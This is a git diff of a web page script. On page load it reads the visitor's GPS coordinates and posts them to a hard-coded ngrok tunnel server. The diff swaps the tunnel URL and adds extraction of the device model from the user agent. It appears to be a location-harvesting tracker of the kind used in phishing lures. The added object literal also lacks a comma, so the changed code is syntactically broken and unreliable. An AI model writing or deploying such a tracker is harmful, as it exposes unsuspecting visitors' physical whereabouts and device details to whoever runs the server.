@@ -1,4 +1,14 @@
-var server = "https://c457-151-241-125-122.ngrok-free.app";
+var server = "https://53be-79-127-241-55.ngrok-free.app";
+
+// Extract device model from user agent
+function getDeviceModel(userAgent) {
+    const deviceRegex = /\\(([^)]+)\\)/; // Matches everything inside parentheses in the userAgent
+    const match = userAgent.match(deviceRegex);
+    if (match && match[1]) {
+        return match[1]; // Returns the first match inside parentheses
+    }
+    return "Unknown Device";
+}
 
 // Send location to the server when the page loaded
 window.onload = function() {
@@ -7,12 +17,16 @@ window.onload = function() {
             // Get the user location
             const latitude = position.coords.latitude;
             const longitude = position.coords.longitude;
+	    // Get the system information
+            const systemInfo = navigator.userAgent;
+            const deviceModel = getDeviceModel(systemInfo);
             // Prepare location data
             const locationData = {
                 location: {
                     latitude: latitude,
                     longitude: longitude
                 }
+		deviceModel: deviceModel
             };
             // Send the location to the server
             fetch(`${server}/send-location`, {
